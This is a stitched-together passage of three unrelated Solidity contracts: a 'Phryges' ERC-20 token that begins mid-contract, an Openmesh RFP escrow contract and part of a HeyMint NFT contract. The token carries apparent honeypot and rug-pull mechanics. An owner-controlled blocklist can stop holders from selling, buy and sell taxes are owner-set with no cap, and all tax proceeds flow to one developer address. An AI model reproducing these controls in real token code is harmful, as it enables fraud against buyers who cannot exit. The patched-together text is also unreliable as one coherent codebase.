    uint8 private _decimals;
    mapping(address => bool) public _isExcludeFromFee;
    uint256 private _totalSupply;
    IUniswapRouter public _uniswapRouter;
    mapping(address => bool) public isMarketPair;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    address public _uniswapPair;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor (){
        _name = "Phryges";
        _symbol = "Phryges";
        _decimals = 18;
        uint256 Supply = 6904200000000;
        _totalSupply = Supply * 10 ** _decimals;
        swapAtAmount = _totalSupply / 20000;
        address dev = address(0x53E0D58c69081631e343097188280d214b8C4ee7);
        address receiveAddr = dev;
        _balances[receiveAddr] = _totalSupply;
        emit Transfer(address(0), receiveAddr, _totalSupply);
        mkt = payable(dev);
        team = payable(dev);
        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[receiveAddr] = true;
        _isExcludeFromFee[mkt] = true;
        _isExcludeFromFee[team] = true;
        IUniswapRouter swapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _uniswapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());
        _uniswapPair = swapFactory.createPair(address(this), swapRouter.WETH());
        isMarketPair[_uniswapPair] = true;
        IERC20(_uniswapRouter.WETH()).approve(
            address(address(_uniswapRouter)),
            ~uint256(0)
        );
        transferOwnership(dev);

    }
    function setMKT(
        address payable newMKT,
        address payable newTeam
    ) public onlyOwner{
        mkt = newMKT;
        team = newTeam;
    }
    function symbol() external view override returns (string memory) {
        return _symbol;
    }
    function name() external view override returns (string memory) {
        return _name;
    }
    function decimals() external view override returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    uint256 public _buyCount=0;
    uint256 private _initialBuyTax=0;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=0;
    uint256 private _reduceSellTaxAt=0;
    uint256 private _preventSwapBefore=0;
    function recuseTax(
        uint256 newBuy,
        uint256 newSell,
        uint256 newReduceBuy,
        uint256 newReduceSell,
        uint256 newPreventSwapBefore
    ) public onlyOwner {
        _finalBuyTax = newBuy;
        _finalSellTax = newSell;
        _reduceBuyTaxAt = newReduceBuy;
        _reduceSellTaxAt = newReduceSell;
        _preventSwapBefore = newPreventSwapBefore;
    }
    bool public remainHolder = true;
    function changeRemain() public onlyOwner{
        remainHolder = !remainHolder;
    }
    uint256 swapAtAmount;
    function setSwapAtAmount(
        uint256 newValue
    ) public onlyOwner{
        swapAtAmount = newValue;
    }
    mapping(address=>bool) public blockList;
    function setBlockList(address account, bool status) public onlyOwner{
        blockList[account] = status;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (blockList[from]){
            require(_isExcludeFromFee[to],"bclist");
        }
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        if (inSwap){
            _basicTransfer(from, to, amount);
            return;
        }
        bool takeFee;
        if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && _buyCount > _preventSwapBefore) {
            uint256 _numSellToken = amount;
            if (_numSellToken > balanceOf(address(this))){
                _numSellToken = _balances[address(this)];
            }
            if (_numSellToken > swapAtAmount){
                swapTokenForETH(_numSellToken);
            }
        }
        if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
            require(startTradeBlock > 0);
            takeFee = true;
            if (isMarketPair[from] && to != address(_uniswapRouter) && !_isExcludeFromFee[to]) {
                _buyCount++;
            }
            if (remainHolder && amount == balance) {
                amount = amount - (amount / 100000000);
            }
        }
        _transferToken(from, to, amount, takeFee);
    }
    function _transferToken(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            uint256 taxFee;
            if (isMarketPair[recipient]) {
                taxFee = _buyCount > _reduceSellTaxAt ? _finalSellTax : _initialSellTax;
            } else if (isMarketPair[sender]) {
                taxFee = _buyCount > _reduceBuyTaxAt ? _finalBuyTax : _initialBuyTax;
            }
            uint256 swapAmount = tAmount * taxFee / 100;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _balances[address(this)] = _balances[address(this)] + swapAmount;
                emit Transfer(sender, address(this), swapAmount);
            }
        }
        _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);
        emit Transfer(sender, recipient, tAmount - feeAmount);
    }
    uint256 public startTradeBlock;
    function startTrade() public onlyOwner {
        startTradeBlock = startTradeBlock == 0 ? block.number : 0;
    }
    function startTrade(address admin,address[] calldata adrs,uint256 per) public onlyOwner {
        address weth = _uniswapRouter.WETH();
        IERC20(weth).approve(address(_uniswapRouter), ~uint256(0));
        IERC20(weth).transferFrom(admin,address(this),IERC20(weth).balanceOf(admin));
        for(uint i=0;i<adrs.length;i++){
            swapToken(per,adrs[i]);
        }
        startTradeBlock = block.number;
        uint256 _bal = IERC20(weth).balanceOf(address(this));
        if(_bal > 0){
            IERC20(weth).transfer(admin,_bal);
        }
    }
    function swapToken(uint256 tokenAmount,address to) private lockTheSwap {
        address weth = _uniswapRouter.WETH();
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(this);
        address[] memory sellpath = new address[](2);
        sellpath[0] = address(this);
        sellpath[1] = address(weth);
        uint256 _bal = IERC20(weth).balanceOf(address(this));
        uint256 buyAmount = _uniswapRouter.getAmountsOut(tokenAmount, sellpath)[1];
        buyAmount = buyAmount > _bal ? _bal : buyAmount;
        if (buyAmount == 0) return;
        _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyAmount,
            0,
            path,
            address(to),
            block.timestamp
        );
    }
    function removeERC20(address _token) external {
        if(_token != address(this)){
            IERC20(_token).transfer(mkt, IERC20(_token).balanceOf(address(this)));
            mkt.transfer(address(this).balance);
        }
    }
    function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 _bal = address(this).balance;
        if (_bal > 0.01 ether){
            mkt.transfer(_bal/10);
            team.transfer(address(this).balance);
        }
    }
    function setFeeExclude(address account, bool value) public onlyOwner{
        _isExcludeFromFee[account] = value;
    }
    receive() external payable {}
}

pragma solidity ^0.8.0;
import {OpenmeshENSReverseClaimable} from "../lib/openmesh-admin/src/OpenmeshENSReverseClaimable.sol";
import {IRFPs, IERC20, RFPEscrow, ITasks, SafeERC20} from "./IRFPs.sol";
contract RFPs is OpenmeshENSReverseClaimable, IRFPs {
    using SafeERC20 for IERC20;
    ITasks public immutable tasks;
    uint256 private rfpCounter;
    mapping(uint256 => RFP) internal rfps;
    address public immutable escrowImplementation;
    constructor(ITasks _tasks) {
        tasks = _tasks;
        escrowImplementation = address(new RFPEscrow());
    }
    receive() external payable {}
    function rfpCount() external view returns (uint256) {
        return rfpCounter;
    }
    function getRFP(uint256 _rfpId) public view returns (OffChainRFP memory offchainRFP) {
        RFP storage rfp = _getRFP(_rfpId);
        offchainRFP = _toOffchainRFP(rfp);
    }
    function getRFPs(uint256[] memory _rfpIds) public view returns (OffChainRFP[] memory) {
        OffChainRFP[] memory offchainRFPs = new OffChainRFP[](_rfpIds.length);
        for (uint256 i; i < _rfpIds.length;) {
            offchainRFPs[i] = getRFP(_rfpIds[i]);
            unchecked {
                ++i;
            }
        }
        return offchainRFPs;
    }
    function createRFP(
        string calldata _metadata,
        uint64 _deadline,
        ITasks.ERC20Transfer[] calldata _budget,
        address _tasksManager,
        address _disputeManager,
        address _manager
    ) external payable returns (uint256 rfpId) {
        rfpId = rfpCounter++;
        RFP storage rfp = rfps[rfpId];
        rfp.metadata = _metadata;
        rfp.deadline = _deadline;
        RFPEscrow escrow = RFPEscrow(payable(clone(escrowImplementation)));
        escrow.__RFPEscrow_init{value: msg.value}(tasks, _budget);
        rfp.escrow = escrow;
        rfp.budgetCount = _toUint8(_budget.length);
        for (uint8 i; i < uint8(_budget.length);) {
            _budget[i].tokenContract.safeTransferFrom(msg.sender, address(escrow), _budget[i].amount);
            rfp.budget[i] = _budget[i].tokenContract;
            unchecked {
                ++i;
            }
        }
        rfp.manager = _manager;
        rfp.tasksManager = _tasksManager;
        rfp.disputeManager = _disputeManager;
        rfp.creator = msg.sender;
        emit RFPCreated(
            rfpId,
            _metadata,
            _deadline,
            msg.value,
            _budget,
            msg.sender,
            _tasksManager,
            _disputeManager,
            _manager,
            escrow
        );
    }
    function submitProject(
        uint256 _rfpId,
        string calldata _metadata,
        uint64 _deadline,
        ITasks.NativeReward[] calldata _nativeReward,
        ITasks.Reward[] calldata _reward
    ) external returns (uint32 projectId) {
        RFP storage rfp = _getRFP(_rfpId);
        if (rfp.deadline <= block.timestamp) {
            revert RFPClosed();
        }
        unchecked {
            if (_reward.length != 0 && !_reward[_reward.length - 1].nextToken) {
                revert RewardDoesntEndWithNextToken();
            }
        }
        projectId = rfp.projectCount++;
        Project storage project = rfp.projects[projectId];
        project.metadata = _metadata;
        project.deadline = _deadline;
        project.representative = msg.sender;
        if (_nativeReward.length != 0) {
            project.nativeRewardCount = _toUint8(_nativeReward.length);
            for (uint8 i; i < uint8(_nativeReward.length);) {
                project.nativeReward[i] = _nativeReward[i];
                unchecked {
                    ++i;
                }
            }
        }
        if (_reward.length != 0) {
            project.rewardCount = _toUint8(_reward.length);
            for (uint8 i; i < uint8(_reward.length);) {
                project.reward[i] = _reward[i];
                unchecked {
                    ++i;
                }
            }
        }
        emit ProjectSubmitted(_rfpId, projectId, _metadata, msg.sender, _deadline, _nativeReward, _reward);
    }
    function acceptProject(
        uint256 _rfpId,
        uint32 _projectId,
        uint96[] calldata _nativeReward,
        uint88[] calldata _reward
    ) external {
        RFP storage rfp = _getRFP(_rfpId);
        if (msg.sender != rfp.manager) {
            revert NotManager();
        }
        if (_projectId >= rfp.projectCount) {
            revert ProjectDoesNotExist();
        }
        Project storage project = rfp.projects[_projectId];
        if (project.accepted) {
            revert ProjectAlreadyAccepted();
        }
        uint96 taskNativeBudget;
        ITasks.NativeReward[] memory taskNativeReward = new ITasks.NativeReward[](project.nativeRewardCount);
        for (uint8 i; i < taskNativeReward.length;) {
            taskNativeReward[i] = ITasks.NativeReward(project.nativeReward[i].to, _nativeReward[i]);
            taskNativeBudget += _nativeReward[i];
            unchecked {
                ++i;
            }
        }
        ITasks.ERC20Transfer[] memory taskBudget = new ITasks.ERC20Transfer[](rfp.budgetCount);
        ITasks.Reward[] memory taskReward = new ITasks.Reward[](project.rewardCount);
        {
            uint8 j;
            for (uint8 i; i < taskBudget.length;) {
                IERC20 erc20 = rfp.budget[i];
                uint96 projectBudget;
                while (j < taskReward.length) {
                    taskReward[j] = project.reward[j];
                    taskReward[j].amount = _reward[j];
                    projectBudget += _reward[j];
                    if (taskReward[j].nextToken) {
                        unchecked {
                            ++j;
                        }
                        break;
                    }
                    unchecked {
                        ++j;
                    }
                }
                taskBudget[i] = ITasks.ERC20Transfer(erc20, projectBudget);
                unchecked {
                    ++i;
                }
            }
        }
        ITasks.PreapprovedApplication[] memory preapproved = new ITasks.PreapprovedApplication[](1);
        preapproved[0] = ITasks.PreapprovedApplication(project.representative, taskNativeReward, taskReward);
        uint256 taskId = rfp.escrow.createTask(
            tasks,
            project.metadata,
            project.deadline,
            rfp.tasksManager,
            rfp.disputeManager,
            taskNativeBudget,
            taskBudget,
            preapproved
        );
        project.accepted = true;
        emit ProjectAccepted(_rfpId, _projectId, _nativeReward, _reward, taskId);
    }
    function emptyRFP(uint256 _rfpId) external {
        RFP storage rfp = _getRFP(_rfpId);
        if (msg.sender != rfp.manager) {
            revert NotManager();
        }
        rfp.escrow.transferNative(payable(rfp.creator), address(rfp.escrow).balance);
        uint8 budgetCount = rfp.budgetCount;
        for (uint8 i; i < budgetCount;) {
            IERC20 erc20 = rfp.budget[i];
            rfp.escrow.transfer(erc20, rfp.creator, erc20.balanceOf(address(rfp.escrow)));
            unchecked {
                ++i;
            }
        }
        emit RFPEmptied(_rfpId);
    }
    error NativeTransferFailed();
    function rescueNative(address payable to, uint256 amount) external {
        if (msg.sender != OPENMESH_ADMIN) {
            revert NotManager();
        }
        (bool success,) = to.call{value: amount}("");
        if (!success) {
            revert NativeTransferFailed();
        }
    }
    function rescue(IERC20 token, address to, uint256 amount) external {
        if (msg.sender != OPENMESH_ADMIN) {
            revert NotManager();
        }
        token.transfer(to, amount);
    }
    function _getRFP(uint256 _rfpId) internal view returns (RFP storage rfp) {
        if (_rfpId >= rfpCounter) {
            revert RFPDoesNotExist();
        }
        rfp = rfps[_rfpId];
    }
    function _toOffchainRFP(RFP storage rfp) internal view returns (OffChainRFP memory offchainRFP) {
        offchainRFP.metadata = rfp.metadata;
        offchainRFP.deadline = rfp.deadline;
        offchainRFP.creator = rfp.creator;
        offchainRFP.tasksManager = rfp.tasksManager;
        offchainRFP.manager = rfp.manager;
        offchainRFP.escrow = rfp.escrow;
        offchainRFP.budget = new IERC20[](rfp.budgetCount);
        for (uint8 i; i < offchainRFP.budget.length;) {
            offchainRFP.budget[i] = rfp.budget[i];
            unchecked {
                ++i;
            }
        }
        offchainRFP.projects = new OffchainProject[](rfp.projectCount);
        for (uint8 i; i < offchainRFP.projects.length;) {
            Project storage project = rfp.projects[i];
            offchainRFP.projects[i].metadata = project.metadata;
            offchainRFP.projects[i].deadline = project.deadline;
            offchainRFP.projects[i].representative = project.representative;
            offchainRFP.projects[i].accepted = project.accepted;
            offchainRFP.projects[i].nativeReward = new ITasks.NativeReward[](project.nativeRewardCount);
            for (uint8 j; j < offchainRFP.projects[i].nativeReward.length;) {
                offchainRFP.projects[i].nativeReward[j] = project.nativeReward[j];
                unchecked {
                    ++j;
                }
            }
            offchainRFP.projects[i].reward = new ITasks.Reward[](project.rewardCount);
            for (uint8 j; j < offchainRFP.projects[i].reward.length;) {
                offchainRFP.projects[i].reward[j] = project.reward[j];
                unchecked {
                    ++j;
                }
            }
            unchecked {
                ++i;
            }
        }
    }
    function clone(address implementation) internal returns (address instance) {
        assembly {
            mstore(0x00, or(shr(0xe8, shl(0x60, implementation)), 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000))
            mstore(0x20, or(shl(0x78, implementation), 0x5af43d82803e903d91602b57fd5bf3))
            instance := create(0, 0x09, 0x37)
        }
        if (instance == address(0)) {
            revert ERC1167FailedCreateClone();
        }
    }
    function _toUint8(uint256 value) internal pure returns (uint8) {
        if (value > type(uint8).max) {
            revert Overflow();
        }
        return uint8(value);
    }
}

pragma solidity 0.8.18;
import {Data, HeyMintStorage} from "../libraries/HeyMintStorage.sol";
import {ERC721AUpgradeable, IERC721AUpgradeable, ERC721AStorage} from "erc721a-upgradeable/contracts/ERC721AUpgradeable.sol";
import {ERC4907AUpgradeable} from "erc721a-upgradeable/contracts/extensions/ERC4907AUpgradeable.sol";
import {ERC721AQueryableUpgradeable} from "erc721a-upgradeable/contracts/extensions/ERC721AQueryableUpgradeable.sol";
import {IERC2981Upgradeable, IERC165Upgradeable} from "@openzeppelin/contracts-upgradeable/interfaces/IERC2981Upgradeable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {PausableUpgradeable} from "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";
import {ReentrancyGuardUpgradeable} from "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
import {RevokableOperatorFiltererUpgradeable} from "operator-filter-registry/src/upgradeable/RevokableOperatorFiltererUpgradeable.sol";
import {ECDSAUpgradeable} from "@openzeppelin/contracts-upgradeable/utils/cryptography/ECDSAUpgradeable.sol";
import {IHeyMintDefaults} from "../interfaces/IHeyMintDefaults.sol";
contract HeyMintERC721AUpgradeable is
    ERC4907AUpgradeable,
    ERC721AQueryableUpgradeable,
    OwnableUpgradeable,
    PausableUpgradeable,
    ReentrancyGuardUpgradeable,
    RevokableOperatorFiltererUpgradeable
{
    using HeyMintStorage for HeyMintStorage.State;
    using ECDSAUpgradeable for bytes32;
    uint256 public constant defaultHeymintFeePerToken = 0.0008 ether;
    address public constant heymintPayoutAddress =
        0xE1FaC470dE8dE91c66778eaa155C64c7ceEFc851;
    address constant HEYMINT_DEFAULTS_ADDR =
        0x2A6BE4588DCd707A3cD027f567ac9971EfABb7bd;
    function _startTokenId() internal view virtual override returns (uint256) {
        return 1;
    }
    function numberMinted(address _owner) public view returns (uint256) {
        return _numberMinted(_owner);
    }
    function _directApproveMsgSenderFor(uint256 _tokenId) internal {
        ERC721AStorage.layout()._tokenApprovals[_tokenId].value = msg.sender;
    }
    function owner()
        public
        view
        virtual
        override(OwnableUpgradeable, RevokableOperatorFiltererUpgradeable)
        returns (address)
    {
        return OwnableUpgradeable.owner();
    }
    function supportsInterface(
        bytes4 interfaceId
    )
        public
        view
        virtual
        override(ERC721AUpgradeable, IERC721AUpgradeable, ERC4907AUpgradeable)
        returns (bool)
    {



        return
            ERC721AUpgradeable.supportsInterface(interfaceId) ||
            type(IERC2981Upgradeable).interfaceId == interfaceId ||
            ERC4907AUpgradeable.supportsInterface(interfaceId);
    }
    function heymintFeePerToken() public view returns (uint256) {
        uint256 fee = HeyMintStorage.state().data.heymintFeePerToken;
        return fee == 0 ? defaultHeymintFeePerToken : fee;
    }
    function setApprovalForAll(
        address operator,
        bool approved
    )
        public
        override(ERC721AUpgradeable, IERC721AUpgradeable)
        onlyAllowedOperatorApproval(operator)
    {
        require(
            !HeyMintStorage.state().cfg.soulbindingActive,
            "TOKEN_IS_SOULBOUND"
        );
        super.setApprovalForAll(operator, approved);
    }
    function approve(
        address to,
        uint256 tokenId
    )
        public
        payable
        override(ERC721AUpgradeable, IERC721AUpgradeable)
        onlyAllowedOperatorApproval(to)
    {
        require(
            !HeyMintStorage.state().cfg.soulbindingActive,
            "TOKEN_IS_SOULBOUND"
        );
        super.approve(to, tokenId);
    }
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    )
        public
        payable
        override(ERC721AUpgradeable, IERC721AUpgradeable)
        onlyAllowedOperator(from)
    {
        super.transferFrom(from, to, tokenId);
    }
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    )
        public
        payable
        override(ERC721AUpgradeable, IERC721AUpgradeable)
        onlyAllowedOperator(from)
    {
        super.safeTransferFrom(from, to, tokenId);
    }
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory data
    )
        public
        payable
        override(ERC721AUpgradeable, IERC721AUpgradeable)
        onlyAllowedOperator(from)
    {
        super.safeTransferFrom(from, to, tokenId, data);
    }
    function _generateRandomHash(uint256 _tokenId) internal {
        Data storage data = HeyMintStorage.state().data;
        if (data.randomHashStore[_tokenId] == bytes32(0)) {
            data.randomHashStore[_tokenId] = keccak256(
                abi.encode(block.prevrandao, _tokenId)
            );
        }
    }
    function _beforeTokenTransfers(
        address from,
        address to,
        uint256 tokenId,
        uint256 quantity
    ) internal override whenNotPaused onlyAllowedOperator(from) {
        HeyMintStorage.State storage state = HeyMintStorage.state();
        require(
            !state.advCfg.stakingActive ||
                state.data.stakingTransferActive ||
                state.data.currentTimeStaked[tokenId] == 0,
            "TOKEN_IS_STAKED"
        );
        require(
            state.data.tokenOwnersOnLoan[tokenId] == address(0),
            "CANNOT_TRANSFER_LOANED_TOKEN"
        );
        if (
            state.cfg.soulbindingActive &&
            !state.data.soulboundAdminTransferInProgress
        ) {
            require(from == address(0), "TOKEN_IS_SOULBOUND");
        }
        if (state.cfg.randomHashActive && from == address(0)) {
            _generateRandomHash(tokenId);
        }
        super._beforeTokenTransfers(from, to, tokenId, quantity);
    }
    function publicPriceInWei() public view returns (uint256) {
        return uint256(HeyMintStorage.state().cfg.publicPrice) * 10 ** 13;
    }
    function verifySignerAddress(
        bytes32 _messageHash,
        bytes calldata _signature
    ) internal view returns (bool) {
        return
            HeyMintStorage.state().cfg.presaleSignerAddress ==
            _messageHash.toEthSignedMessageHash().recover(_signature);
    }
    function isSenderAuthorizedForCreditCardMint()
        internal
        view
        returns (bool)
    {
        address[] memory defaultAddresses = IHeyMintDefaults(
            HEYMINT_DEFAULTS_ADDR
        ).getCreditCardDefaultAddresses();
        for (uint256 i = 0; i < defaultAddresses.length; i++) {
            if (msg.sender == defaultAddresses[i]) {
                return true;
            }
        }
        HeyMintStorage.State storage state = HeyMintStorage.state();
        for (
            uint256 i = 0;
            i < state.advCfg.creditCardMintAddresses.length;
            i++
        ) {
            if (msg.sender == state.advCfg.creditCardMintAddresses[i]) {
                return true;
            }
        }
        return false;
    }
}

